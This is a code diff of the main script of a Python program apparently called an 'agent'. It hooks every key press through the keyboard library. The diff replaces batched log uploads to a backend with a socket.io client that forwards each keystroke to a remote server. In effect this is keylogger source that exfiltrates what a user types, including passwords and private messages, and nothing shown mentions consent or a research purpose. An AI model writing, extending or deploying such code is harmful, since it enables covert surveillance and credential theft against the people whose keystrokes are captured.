@@ -1,15 +1,27 @@
+import sys
 import keyboard
+
 import get_key
-from agent.print_keystrokes import send_logs_to_backend
-from text_by_minute import key_by_minute
-from chek_if_show import check_if_get_show
+from print_credit import print_welcome
+from socket_client import init_socket, disconnect_handler
 
-def call_on_key(e):
-    get_key.on_key(e)
-    if check_if_get_show(get_key.details_keys):
-        r_key_by_minute = key_by_minute(get_key.details_keys)
-        send_logs_to_backend(r_key_by_minute)
-        get_key.details_keys.clear()
+debug = 'debug' in sys.argv # run with "python main.py debug" for local testing
+sio = init_socket(debug)
 
-keyboard.on_press(call_on_key)
-keyboard.wait("ctrl+shift+g")
+
+def main():
+    print_welcome()
+
+    sio.on('connect', lambda: print('Connected to server'))
+    sio.on('disconnect', lambda: disconnect_handler())
+    sio.on('res', lambda data: print('Message from server:', data))
+    keyboard.on_press(lambda e: get_key.on_key(e, sio))
+
+    sio.wait()
+
+if __name__ == '__main__':
+    try:
+        main()
+    except KeyboardInterrupt:
+        # Handle Ctrl+C gracefully
+        sio.disconnect()
